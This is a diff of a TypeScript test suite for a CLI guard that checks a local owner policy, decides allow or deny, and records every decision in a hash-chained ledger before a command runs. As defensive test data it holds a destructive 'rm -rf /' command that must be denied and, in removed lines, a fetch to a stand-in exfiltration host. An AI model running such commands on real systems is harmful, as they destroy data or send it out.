@@ -1,6 +1,6 @@
 /**
- * `~/.trustshell/guardrails.json`: one user-tuned file the CLI enforces. A disallowed action is refused
- * BEFORE it runs, and the refusal is receipted on a hash chain. No file: nothing changes at all.
+ * GUARD: the owner's local policy (a subset of the engine kernel's OwnerPolicy), enforced by `trustshell run`
+ * before a command starts, with a record of every decision. One allowed and one denied action, both recorded.
  * Every test uses a temp TRUSTSHELL_HOME; the real home is never read or written.
  */
 import { createHash } from 'node:crypto';
@@ -8,312 +8,264 @@ import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
 import { tmpdir } from 'node:os';
 import { join } from 'node:path';
 import { parseArgs, run, type CliIO } from '../src/cli';
-import { EXIT_REFUSED, plannedAction, runGuarded } from '../src/cli/guard';
+import { EXIT_REFUSED, RUN_SCOPE, runGuarded, runRun, type Spawner } from '../src/cli/guard';
 import {
-  decide,
-  defaultGuardrails,
   GUARD_CHECKPOINT_FILE,
   GUARD_RECEIPTS_FILE,
-  GUARDRAILS_FILE,
-  guardAction,
-  parseGuardrails,
+  POLICY_FILE,
+  decide,
+  defaultPolicy,
+  guardDecide,
+  parsePolicy,
+  parsePolicyDocument,
   readLedger,
   readLedgerCheckpointed,
-  renderGuardrails,
-  type GuardReceipt,
-  type Guardrails,
+  renderPolicyDocument,
+  type GuardRecord,
+  type LocalPolicy,
 } from '../src/lib/guardrails';
 import { canonicalize } from '../src/lib/jcs';
 
-const ENGINE = 'repid-engine-production.up.railway.app';
+const NOW = 1_800_000_000; // 2027-01-15
+const policy = (over: Partial<LocalPolicy> = {}): LocalPolicy => ({ ...defaultPolicy(NOW), ...over });
+const SCOPE = { mediated: ['test'], not_mediated: ['test'] };
 
-function rules(over: Partial<Guardrails> = {}): Guardrails {
-  return { ...defaultGuardrails(), ...over };
-}
-
-describe('parseGuardrails: a broken file refuses everything, never fails open', () => {
-  it('the default file round-trips and is default-deny', () => {
-    const g = parseGuardrails(renderGuardrails(defaultGuardrails())).guardrails as Guardrails;
-    expect(g.egress.allow).toEqual([]);
-    expect(g.tools.allow).not.toContain('verify');
-    expect(g.limits).toMatchObject({ spend_per_action: '0', spend_total: '0' });
+describe('parsePolicy: the kernel parser rules, field for field', () => {
+  it('a limit left out is "0" and is reported; a present malformed one is an error', () => {
+    const r = parsePolicy({ subject: 'a', actions: ['tool'], expires_at: NOW, nonce: '1' });
+    expect(r.ok && r.policy).toMatchObject({ per_tx_raw: '0', daily_raw: '0', total_raw: '0' });
+    expect(r.ok && r.defaulted).toEqual(['per_tx_raw', 'daily_raw', 'total_raw']);
+    expect(parsePolicy({ subject: 'a', actions: [], per_tx_raw: '1.5', expires_at: NOW, nonce: '1' }).ok).toBe(false);
   });
 
   it.each([
-    ['a misspelt section', JSON.stringify({ ...defaultGuardrails(), egres: { allow: [] } })],
-    ['a URL instead of a host', JSON.stringify(rules({ egress: { allow: ['https://api.github.com'] } }))],
-    ['a wildcard host', JSON.stringify(rules({ egress: { allow: ['*.github.com'] } }))],
-    ['a number as a limit', JSON.stringify({ ...defaultGuardrails(), limits: { unit: 'x', spend_per_action: 5, spend_total: '0' } })],
-    ['a negative limit', JSON.stringify({ ...defaultGuardrails(), limits: { unit: 'x', spend_per_action: '-1', spend_total: '0' } })],
-    ['another version', JSON.stringify({ ...defaultGuardrails(), trustshell_guardrails: 2 })],
-    ['not JSON', '{ egress: none }'],
-  ])('%s', (_name, text) => {
-    const r = parseGuardrails(text);
-    expect(r.guardrails).toBeNull();
-    expect(r.problems.length).toBeGreaterThan(0);
-    expect(decide(r.guardrails, { tool: 'recall', hosts: [] }, BigInt(0), r.problems).decision).toBe('REFUSED');
+    ['an unknown field (a misspelt limit is not a zero limit)', { subject: 'a', actions: [], per_tx: '5', expires_at: NOW, nonce: '1' }],
+    ['an action outside spend | post | tool | tool:<name>', { subject: 'a', actions: ['shell'], expires_at: NOW, nonce: '1' }],
+    ['an action listed twice', { subject: 'a', actions: ['tool', 'tool'], expires_at: NOW, nonce: '1' }],
+    ['expires_at that is not unix seconds', { subject: 'a', actions: [], expires_at: '2030-01-01', nonce: '1' }],
+    ['a negative limit', { subject: 'a', actions: [], total_raw: '-1', expires_at: NOW, nonce: '1' }],
+    ['a nonce that is not a decimal integer', { subject: 'a', actions: [], expires_at: NOW, nonce: '0x10' }],
+    ['no subject', { actions: [], expires_at: NOW, nonce: '1' }],
+  ])('%s is an error', (_n, input) => {
+    expect(parsePolicy(input).ok).toBe(false);
   });
 
-  it('accepts a byte-order mark (PowerShell writes one)', () => {
-    expect(parseGuardrails('﻿' + renderGuardrails(defaultGuardrails())).guardrails).not.toBeNull();
+  it('{ policy, signature } with a byte-order mark parses (PowerShell writes one); a stray field does not', () => {
+    expect(parsePolicyDocument('﻿' + renderPolicyDocument({ policy: policy(), signature: null })).ok).toBe(true);
+    expect(parsePolicyDocument(JSON.stringify({ policy: policy(), signature: null, note: 'x' })).ok).toBe(false);
   });
 });
 
-describe('decide: every broken rule is named', () => {
-  const g = rules({ egress: { allow: ['api.github.com'] }, tools: { allow: ['check', 'pay'] }, limits: { unit: 'u', spend_per_action: '100', spend_total: '150' } });
+describe('decide: what the kernel would say', () => {
+  const p = policy({ actions: ['tool:git', 'spend'], per_tx_raw: '100', daily_raw: '120', total_raw: '150' });
+  const none = { today: BigInt(0), total: BigInt(0) };
 
-  it('allows what the rules allow', () => {
-    expect(decide(g, { tool: 'check', hosts: ['api.github.com'] }, BigInt(0))).toEqual({ decision: 'ALLOWED', reasons: [] });
-    expect(decide(g, { tool: 'pay', hosts: [], spend: '100' }, BigInt(50))).toEqual({ decision: 'ALLOWED', reasons: [] });
+  it('a listed tool is allowed; an unlisted one is denied, naming the action', () => {
+    expect(decide(p, { tool: 'git', class: 'other' }, none, NOW)).toEqual({ decision: 'ALLOWED', reasons: [] });
+    expect(decide(p, { tool: 'shell', class: 'other' }, none, NOW).reasons).toEqual(['the owner policy does not list tool:shell']);
+    expect(decide(policy({ actions: ['tool'] }), { tool: 'anything', class: 'read' }, none, NOW).decision).toBe('ALLOWED');
+    expect(decide(policy({ actions: ['tool'] }), { tool: 'x', class: 'post' }, none, NOW).reasons).toEqual(['the owner policy does not list post']);
   });
 
-  it('refuses a tool, a host and a spend, all at once', () => {
-    const d = decide(g, { tool: 'verify', hosts: [ENGINE], spend: '101' }, BigInt(100));
-    expect(d.decision).toBe('REFUSED');
-    expect(d.reasons).toEqual([
-      'tool "verify" is not in tools.allow',
-      `egress to ${ENGINE} is not in egress.allow`,
-      'spend 101 is over spend_per_action 100 (u)',
-      'spend 101 would take the total to 201, over spend_total 150 (u)',
+  it('the smallest limit binds: per action, what is left today, what is left in total', () => {
+    expect(decide(p, { tool: 'pay', class: 'spend', amount_raw: '101' }, none, NOW).reasons).toEqual(['101 is over per_tx_raw 100']);
+    expect(decide(p, { tool: 'pay', class: 'spend', amount_raw: '50' }, { today: BigInt(100), total: BigInt(100) }, NOW).reasons).toEqual([
+      '50 is over what daily_raw 120 leaves today (20)',
+    ]);
+    expect(decide(p, { tool: 'pay', class: 'spend', amount_raw: '60' }, { today: BigInt(0), total: BigInt(100) }, NOW).reasons).toEqual([
+      '60 is over what total_raw 150 leaves (50)',
     ]);
   });
 
-  it('a broken ledger refuses any spend; a zero, negative or decimal spend is refused', () => {
-    expect(decide(g, { tool: 'pay', hosts: [], spend: '1' }, null).reasons).toEqual(['the receipt ledger is BROKEN, so the running total is unknown and no spend is allowed']);
-    for (const s of ['0', '-5', '1.5', '1e3']) expect(decide(g, { tool: 'pay', hosts: [], spend: s }, BigInt(0)).decision).toBe('REFUSED');
+  it('expired, broken ledger, zero or decimal amounts: denied', () => {
+    expect(decide(policy({ expires_at: NOW }), { tool: 'git', class: 'other' }, none, NOW).reasons[0]).toMatch(/^the policy expired at/);
+    expect(decide(p, { tool: 'pay', class: 'spend', amount_raw: '1' }, null, NOW).reasons[0]).toMatch(/ledger is BROKEN/);
+    for (const a of ['0', '1.5', '-1', '1e3']) expect(decide(p, { tool: 'pay', class: 'spend', amount_raw: a }, none, NOW).decision).toBe('DENIED');
+    expect(decide(null, { tool: 'git', class: 'other' }, none, NOW, ['broken']).decision).toBe('DENIED');
   });
 });
 
-describe('the receipt ledger', () => {
+describe('the record ledger', () => {
   let home = '';
   beforeEach(() => {
     home = mkdtempSync(join(tmpdir(), 'ts-guard-ledger-'));
-    writeFileSync(join(home, GUARDRAILS_FILE), renderGuardrails(rules({ tools: { allow: ['pay'] }, limits: { unit: 'u', spend_per_action: '100', spend_total: '150' } })));
+    writeFileSync(join(home, POLICY_FILE), renderPolicyDocument({ policy: policy({ actions: ['spend', 'tool:git'], per_tx_raw: '100', daily_raw: '1000', total_raw: '150' }), signature: null }));
   });
   afterEach(() => rmSync(home, { recursive: true, force: true }));
-  const lines = () => readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').trim().split('\n');
+  const text = () => readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8');
 
-  it('chains every decision, totals only ALLOWED spends, and refuses past the total', () => {
-    expect(guardAction(home, { tool: 'pay', hosts: [], spend: '100' })?.decision.decision).toBe('ALLOWED');
-    expect(guardAction(home, { tool: 'nope', hosts: [], spend: '10' })?.decision.decision).toBe('REFUSED');
-    const third = guardAction(home, { tool: 'pay', hosts: [], spend: '60' });
-    expect(third?.decision.reasons).toEqual(['spend 60 would take the total to 160, over spend_total 150 (u)']);
-    const l = readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8'));
-    expect(l).toMatchObject({ verdict: 'INTACT', count: 3, spent: BigInt(100) });
-    const r = JSON.parse(lines()[2] as string) as GuardReceipt;
-    expect(r.prev).toBe((JSON.parse(lines()[1] as string) as GuardReceipt).hash);
-    expect(r.guardrails_sha256).toMatch(/^[0-9a-f]{64}$/);
+  it('chains every decision, counts only ALLOWED amounts, and states its scope', () => {
+    expect(guardDecide(home, { tool: 'pay', class: 'spend', amount_raw: '100' }, SCOPE, { nowS: NOW })?.decision.decision).toBe('ALLOWED');
+    expect(guardDecide(home, { tool: 'shell', class: 'other' }, SCOPE, { nowS: NOW })?.decision.decision).toBe('DENIED');
+    expect(guardDecide(home, { tool: 'pay', class: 'spend', amount_raw: '60' }, SCOPE, { nowS: NOW })?.decision.reasons).toEqual(['60 is over what total_raw 150 leaves (50)']);
+    const l = readLedger(text(), NOW);
+    expect(l).toMatchObject({ verdict: 'INTACT', count: 3 });
+    expect(l.spent).toEqual({ today: BigInt(100), total: BigInt(100) });
+    const r = JSON.parse(text().trim().split('\n')[1] as string) as GuardRecord;
+    expect(r).toMatchObject({ kind: 'decision', executed: 'not run', requested: { action: 'tool:shell' }, authorized: { decision: 'DENIED' }, assurance_scope: SCOPE });
+    expect(r.authorized.policy_sha256).toMatch(/^[0-9a-f]{64}$/);
+    expect(canonicalize(r)).toBe(text().trim().split('\n')[1]);
   });
 
-  it('an edited line or a deleted line breaks the chain, and then no spend is allowed', () => {
-    guardAction(home, { tool: 'pay', hosts: [], spend: '100' });
-    guardAction(home, { tool: 'pay', hosts: [], spend: '10' });
-    guardAction(home, { tool: 'nope', hosts: [] });
-    const original = lines();
-    // Lower the recorded spend to make room under the total.
-    writeFileSync(join(home, GUARD_RECEIPTS_FILE), [original[0]?.replace('"spend":"100"', '"spend":"1"'), ...original.slice(1)].join('\n') + '\n');
-    expect(readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8')).verdict).toBe('BROKEN');
-    expect(guardAction(home, { tool: 'pay', hosts: [], spend: '1' })?.decision.reasons).toContain(
-      'the receipt ledger is BROKEN, so the running total is unknown and no spend is allowed',
-    );
-    // Delete the middle line instead.
-    writeFileSync(join(home, GUARD_RECEIPTS_FILE), [original[0], original[2]].join('\n') + '\n');
-    expect(readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8')).verdict).toBe('BROKEN');
-  });
-
-  it('the checkpoint gives exactly the full verification, and an edit to an old line still breaks the chain', () => {
-    for (let i = 0; i < 5; i++) guardAction(home, { tool: 'pay', hosts: [], spend: '10' });
-    const text = readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8');
-    const cp = readFileSync(join(home, GUARD_CHECKPOINT_FILE), 'utf8');
-    expect(readLedgerCheckpointed(text, cp)).toEqual(readLedger(text));
-    // Lower an OLD spend (inside the checkpointed bytes): the bytes no longer match, so everything is re-verified.
-    writeFileSync(join(home, GUARD_RECEIPTS_FILE), text.replace('"spend":"10"', '"spend":"1"'));
-    expect(guardAction(home, { tool: 'pay', hosts: [], spend: '1' })?.decision.reasons).toContain(
-      'the receipt ledger is BROKEN, so the running total is unknown and no spend is allowed',
-    );
-  });
-
-  it('a forged checkpoint hides an edit from a decision, never from guard show (which re-verifies every line)', () => {
-    guardAction(home, { tool: 'pay', hosts: [], spend: '100' });
-    const edited = readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').replace('"spend":"100"', '"spend":"1"');
-    writeFileSync(join(home, GUARD_RECEIPTS_FILE), edited);
-    const bytes = Buffer.from(edited, 'utf8');
-    writeFileSync(join(home, GUARD_CHECKPOINT_FILE), JSON.stringify({ bytes: bytes.length, sha256: createHash('sha256').update(bytes).digest('hex') }));
-    // The limit this documents (GUARD_DOES_NOT_COVER): the ledger and its checkpoint are unkeyed files.
-    expect(readLedgerCheckpointed(edited, readFileSync(join(home, GUARD_CHECKPOINT_FILE), 'utf8')).verdict).toBe('INTACT');
-    expect(readLedger(edited).verdict).toBe('BROKEN');
-  });
-
-  it('each line is its own RFC 8785 form', () => {
-    guardAction(home, { tool: 'pay', hosts: [] });
-    const line = lines()[0] as string;
-    expect(canonicalize(JSON.parse(line))).toBe(line);
+  it('an edited old record breaks the chain even through the checkpoint, and then no amount is allowed', () => {
+    for (let i = 0; i < 3; i++) guardDecide(home, { tool: 'pay', class: 'spend', amount_raw: '10' }, SCOPE, { nowS: NOW });
+    expect(readLedgerCheckpointed(text(), readFileSync(join(home, GUARD_CHECKPOINT_FILE), 'utf8'), NOW)).toEqual(readLedger(text(), NOW));
+    writeFileSync(join(home, GUARD_RECEIPTS_FILE), text().replace('"amount_raw":"10"', '"amount_raw":"1"'));
+    expect(guardDecide(home, { tool: 'pay', class: 'spend', amount_raw: '1' }, SCOPE, { nowS: NOW })?.decision.reasons[0]).toMatch(/ledger is BROKEN/);
   });
 });
 
-describe('the CLI enforces the file', () => {
+describe('trustshell run: decided and recorded before the command starts', () => {
   const prevEnv = { ...process.env };
-  const prevFetch = global.fetch;
   let home = '';
-  let dialed: string[] = [];
+  let out: string[] = [];
+  let err: string[] = [];
+  const io: CliIO = { out: (s) => out.push(s), err: (s) => err.push(s) };
+  let started: string[][] = [];
+  const spawner: Spawner = (cmd, args) => {
+    started.push([cmd, ...args]);
+    return { status: 0, signal: null };
+  };
+  const records = (): GuardRecord[] => readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').trim().split('\n').map((l) => JSON.parse(l) as GuardRecord);
+
+  beforeEach(() => {
+    home = mkdtempSync(join(tmpdir(), 'ts-guard-run-'));
+    process.env.TRUSTSHELL_HOME = home;
+    out = [];
+    err = [];
+    started = [];
+  });
+  afterEach(() => {
+    process.env = { ...prevEnv };
+    rmSync(home, { recursive: true, force: true });
+  });
+  const policyFile = (p: LocalPolicy) => writeFileSync(join(home, POLICY_FILE), renderPolicyDocument({ policy: p, signature: null }));
+  const runIt = (...argv: string[]) => runRun(argv, io, process.env, spawner);
+
+  it('no policy: nothing is authorized, nothing starts, nothing is recorded', () => {
+    expect(runIt('--tool', 'git', '--', 'git', 'status')).toBe(2);
+    expect(started).toEqual([]);
+    expect(err.join('\n')).toMatch(/^NOT_CHECKED no policy/);
+  });
+
+  it('ONE ALLOWED action: the command starts, and a decision and an outcome are recorded', () => {
+    policyFile(policy({ actions: ['tool:git'] }));
+    expect(runIt('--tool', 'git', '--', 'git', 'status', '--short')).toBe(0);
+    expect(started).toEqual([['git', 'status', '--short']]);
+    const [d, o] = records();
+    expect(d).toMatchObject({ kind: 'decision', authorized: { decision: 'ALLOWED' }, executed: null, assurance_scope: RUN_SCOPE });
+    expect(o).toMatchObject({ kind: 'outcome', authorized: { decision: 'ALLOWED' }, executed: { exit_code: 0, signal: null } });
+    // The command is recorded by hash, never by its text.
+    expect(d?.requested.command_sha256).toBe(createHash('sha256').update(JSON.stringify(['git', 'status', '--short'])).digest('hex'));
+    expect(JSON.stringify(records())).not.toContain('--short');
+    const card = err.join('\n');
+    for (const field of ['requested', 'authorized', 'executed', 'independently observed', 'unknown']) expect(card).toContain(field);
+  });
+
+  it('ONE DENIED action: the command NEVER starts (exit 5), and the denial is recorded', () => {
+    policyFile(policy({ actions: ['tool:git'] }));
+    expect(runIt('--tool', 'shell', '--', 'rm', '-rf', '/')).toBe(EXIT_REFUSED);
+    expect(started).toEqual([]);
+    expect(records()).toHaveLength(1);
+    expect(records()[0]).toMatchObject({ kind: 'decision', authorized: { decision: 'DENIED', reasons: ['the owner policy does not list tool:shell'] }, executed: 'not run' });
+    expect(err.join('\n')).toContain('executed              not run');
+  });
+
+  it('a spend over the per-action limit is denied before it starts; the command exit code passes through when allowed', () => {
+    policyFile(policy({ actions: ['spend'], per_tx_raw: '100', daily_raw: '100', total_raw: '100' }));
+    expect(runIt('--tool', 'pay', '--class', 'spend', '--amount', '101', '--', 'pay')).toBe(EXIT_REFUSED);
+    expect(started).toEqual([]);
+    const failing: Spawner = () => ({ status: 7, signal: null });
+    expect(runRun(['--tool', 'pay', '--class', 'spend', '--amount', '100', '--', 'pay'], io, process.env, failing)).toBe(7);
+    expect(records().pop()).toMatchObject({ kind: 'outcome', executed: { exit_code: 7 } });
+  });
+
+  it('a policy that does not parse denies everything; an expired one too', () => {
+    writeFileSync(join(home, POLICY_FILE), '{ "policy": ');
+    expect(runIt('--tool', 'git', '--', 'git')).toBe(EXIT_REFUSED);
+    policyFile(policy({ actions: ['tool:git'], expires_at: 1 }));
+    expect(runIt('--tool', 'git', '--', 'git')).toBe(EXIT_REFUSED);
+    expect(started).toEqual([]);
+  });
+
+  it('usage: --tool and a command after -- are required', () => {
+    policyFile(policy({ actions: ['tool:git'] }));
+    expect(runIt('--', 'git')).toBe(2);
+    expect(runIt('--tool', 'git')).toBe(2);
+    expect(runIt('--tool', 'git', '--class', 'shell', '--', 'git')).toBe(2);
+    expect(started).toEqual([]);
+  });
+});
+
+describe('the gate and the guard verbs', () => {
+  const prevEnv = { ...process.env };
+  let home = '';
   let out: string[] = [];
   let err: string[] = [];
   const io: CliIO = { out: (s) => out.push(s), err: (s) => err.push(s) };
   let calls: string[] = [];
-  const client = {
-    verifyOutput: async () => {
-      calls.push('verifyOutput');
-      return { verdict: 'PASS', trustScore: 90 };
-    },
-    getRepID: async () => {
-      calls.push('getRepID');
-      return { agentId: 'a', repid: 1, tier: 'x' };
-    },
-  } as never;
-
-  /** As the real entry point runs a command: through the gate. */
+  const client = { verifyOutput: async () => (calls.push('verifyOutput'), { verdict: 'PASS', trustScore: 90 }) } as never;
   const cli = async (...argv: string[]) => {
     out = [];
     err = [];
     const args = parseArgs(argv);
     return runGuarded(args, () => run(args, client, io), io, process.env);
   };
-  const receipts = (): GuardReceipt[] =>
-    readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').trim().split('\n').map((l) => JSON.parse(l) as GuardReceipt);
+  const doc = () => JSON.parse(readFileSync(join(home, POLICY_FILE), 'utf8')) as { policy: LocalPolicy; signature: unknown };
 
   beforeEach(() => {
     home = mkdtempSync(join(tmpdir(), 'ts-guard-cli-'));
     process.env.TRUSTSHELL_HOME = home;
     process.env.TRUSTSHELL_MEMORY = join(home, 'memory.sqlite');
-    delete process.env.TRUSTSHELL_API_URL;
-    delete process.env.OFFLINE;
-    dialed = [];
     calls = [];
-    global.fetch = (async (input: RequestInfo | URL) => {
-      dialed.push(String(input));
-      throw new Error('network');
-    }) as typeof fetch;
   });
   afterEach(() => {
-    global.fetch = prevFetch;
     process.env = { ...prevEnv };
     rmSync(home, { recursive: true, force: true });
   });
 
-  it('no file: the gate does nothing and writes nothing', async () => {
+  it('no policy file: the gate does nothing and writes nothing', async () => {
     expect(await cli('remember', '--trusted', 'a note')).toBe(0);
     expect(() => readFileSync(join(home, GUARD_RECEIPTS_FILE))).toThrow();
-    expect(await cli('guard', 'check', '--tool', 'pay')).toBe(2);
-    expect(out.join('\n')).toMatch(/^NOT_CHECKED .*This is not an allow\./);
+    expect(await cli('guard', 'check', '--tool', 'git')).toBe(2);
   });
 
-  it('a disallowed command is refused before it runs (exit 5), dials nothing, and is receipted', async () => {
+  it('with the default policy a local command runs; one it does not list is denied before it runs', async () => {
     expect(await cli('guard', 'init')).toBe(0);
+    expect(await cli('remember', '--trusted', 'ship the receipt')).toBe(0);
     expect(await cli('verify', 'Paris is the capital of France.')).toBe(EXIT_REFUSED);
     expect(calls).toEqual([]);
-    expect(dialed).toEqual([]);
-    expect(err.join('\n')).toContain('tool "verify" is not in tools.allow');
-    expect(err.join('\n')).toContain(`egress to ${ENGINE} is not in egress.allow`);
-    const [r] = receipts();
-    expect(r).toMatchObject({ seq: 1, origin: 'Cli', decision: 'REFUSED', action: { tool: 'verify', hosts: [ENGINE] } });
-    // The receipt names the action, never the text it was given.
-    expect(JSON.stringify(r)).not.toContain('Paris');
-    expect(readLedger(readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8')).verdict).toBe('INTACT');
+    expect(err.join('\n')).toContain('the owner policy does not list tool:verify');
+    const recs = readFileSync(join(home, GUARD_RECEIPTS_FILE), 'utf8').trim().split('\n').map((l) => JSON.parse(l) as GuardRecord);
+    expect(recs.map((r) => [r.requested.tool, r.authorized.decision])).toEqual([['remember', 'ALLOWED'], ['verify', 'DENIED']]);
+    expect(JSON.stringify(recs)).not.toContain('Paris'); // the action, never its text
   });
 
-  it('an allowed local command runs and is receipted ALLOWED', async () => {
+  it('every change is a new policy with a higher nonce; an edit drops a now-stale signature; kill allows nothing', async () => {
     await cli('guard', 'init');
-    expect(await cli('remember', '--trusted', 'ship the receipt')).toBe(0);
-    expect(out).toEqual(['remembered']);
-    expect(receipts().map((r) => [r.action.tool, r.decision])).toEqual([['remember', 'ALLOWED']]);
+    const n0 = BigInt(doc().policy.nonce);
+    await cli('guard', 'allow', 'tool:git');
+    expect(BigInt(doc().policy.nonce)).toBe(n0 + BigInt(1));
+    expect(await cli('guard', 'sign')).toBe(0);
+    expect(doc().signature).not.toBeNull();
+    await cli('guard', 'limit', 'per-tx', '50');
+    expect(doc().signature).toBeNull();
+    expect(err.join('\n')).toContain('signature covered the old policy');
+    await cli('guard', 'kill');
+    expect(doc().policy.actions).toEqual([]);
+    expect(await cli('remember', '--trusted', 'x')).toBe(EXIT_REFUSED);
   });
 
-  it('allowing the tool is not enough: the host must be allowed too', async () => {
+  it('edits are validated; help, version and guard always run; init --pai is denied while a policy exists', async () => {
     await cli('guard', 'init');
-    await cli('guard', 'allow', 'tool', 'repid');
-    expect(await cli('repid', 'agent-1')).toBe(EXIT_REFUSED);
-    expect(calls).toEqual([]);
-    await cli('guard', 'allow', 'host', ENGINE);
-    expect(await cli('repid', 'agent-1')).toBe(0);
-    expect(calls).toEqual(['getRepID']);
-  });
-
-  it('the fetch backstop refuses a host the table did not predict, and receipts it', async () => {
-    await cli('guard', 'init');
-    await cli('guard', 'allow', 'tool', 'repid');
-    await cli('guard', 'allow', 'host', ENGINE);
-    const args = parseArgs(['repid', 'agent-1']);
-    const stub = global.fetch;
-    const code = await runGuarded(args, async () => {
-      await fetch(`https://${ENGINE}/api/v1/ok`).catch(() => undefined); // allowed: reaches the stub
-      await fetch('https://evil.example/exfil').catch(() => undefined); // not allowed: never reaches it
-      return 0;
-    }, io, process.env);
-    expect(code).toBe(EXIT_REFUSED);
-    expect(dialed).toEqual([`https://${ENGINE}/api/v1/ok`]);
-    const last = receipts().pop();
-    expect(last).toMatchObject({ decision: 'REFUSED', action: { tool: 'repid', hosts: ['evil.example'] } });
-    expect(global.fetch).toBe(stub); // the gate puts the process fetch back
-  });
-
-  it('a file that does not parse refuses every guarded command', async () => {
-    writeFileSync(join(home, GUARDRAILS_FILE), '{ "egress": ');
-    expect(await cli('recall')).toBe(EXIT_REFUSED);
-    expect(err.join('\n')).toContain('does not parse');
-    expect(await cli('guard', 'show')).toBe(1);
-  });
-
-  it('help, version and guard always run, so the person is never locked out of the rules', async () => {
-    writeFileSync(join(home, GUARDRAILS_FILE), 'broken');
+    expect(await cli('guard', 'allow', 'shell')).toBe(2);
+    expect(await cli('guard', 'limit', 'total', '-1')).toBe(2);
+    writeFileSync(join(home, POLICY_FILE), 'broken');
     expect(await cli('--version')).toBe(0);
-    expect(await cli('guard', 'init', '--force')).toBe(0);
-    expect(await cli('guard', 'show')).toBe(0);
-  });
-
-  it('init --pai is refused while a file is in force: its child process is outside the guard', async () => {
-    await cli('guard', 'init');
+    expect(await cli('guard', 'show')).toBe(1);
+    expect(await cli('recall')).toBe(EXIT_REFUSED);
+    await cli('guard', 'init', '--force');
     expect(await cli('init', '--pai', '--name', 'x')).toBe(EXIT_REFUSED);
     expect(err.join('\n')).toContain('init --pai spawns scripts/init-pai.mjs');
-    expect(await cli('init', '--pai', '--dry-run')).toBe(0);
-  });
-
-  it('guard check: 0 allowed, 5 refused, totals across calls, receipts every answer', async () => {
-    await cli('guard', 'init');
-    await cli('guard', 'allow', 'tool', 'pay');
-    await cli('guard', 'limit', 'per-action', '100');
-    await cli('guard', 'limit', 'total', '150');
-    expect(await cli('guard', 'check', '--tool', 'pay', '--spend', '100')).toBe(0);
-    expect(await cli('guard', 'check', '--tool', 'pay', '--spend', '100')).toBe(EXIT_REFUSED);
-    expect(out.join('\n')).toContain('over spend_total 150');
-    expect(await cli('guard', 'check', '--tool', 'shell', '--host', 'evil.example', '--json')).toBe(EXIT_REFUSED);
-    expect(JSON.parse(out.join('\n'))).toMatchObject({ decision: 'REFUSED', receipt: { seq: 3 } });
-    expect(await cli('guard', 'show')).toBe(0);
-    expect(out.join('\n')).toContain('100 allowed so far');
-  });
-
-  it('guard edits are validated before they are written', async () => {
-    await cli('guard', 'init');
-    expect(await cli('guard', 'allow', 'host', 'https://evil.example/')).toBe(2);
-    expect(await cli('guard', 'limit', 'total', '-1')).toBe(2);
-    expect(parseGuardrails(readFileSync(join(home, GUARDRAILS_FILE), 'utf8')).guardrails).toEqual(defaultGuardrails());
-  });
-});
-
-describe('plannedAction mirrors the HELP egress table', () => {
-  const env = {} as NodeJS.ProcessEnv;
-  it.each([
-    [['verify', 'x'], [ENGINE]],
-    [['check', 'https://github.com/o/r/actions/runs/1'], ['api.github.com']],
-    [['check', '2 + 2 = 4'], [ENGINE]],
-    [['quarantine', 'release', '1', '--check', 'hal'], [ENGINE]],
-    [['quarantine', 'release', '1', '--trusted'], []],
-    [['recall'], []],
-    [['bundle', 'export', 'f.json'], []],
-  ])('%j dials %j', (argv, hosts) => {
-    expect(plannedAction(parseArgs(argv as string[]), env).action.hosts).toEqual(hosts);
-  });
-  it('OFFLINE=1 dials nothing; TRUSTSHELL_API_URL moves the backend host', () => {
-    expect(plannedAction(parseArgs(['verify', 'x']), { NODE_ENV: 'test', OFFLINE: '1' }).action.hosts).toEqual([]);
-    expect(plannedAction(parseArgs(['repid', 'a']), { NODE_ENV: 'test', TRUSTSHELL_API_URL: 'https://engine.example.org/' }).action.hosts).toEqual(['engine.example.org']);
   });
 });
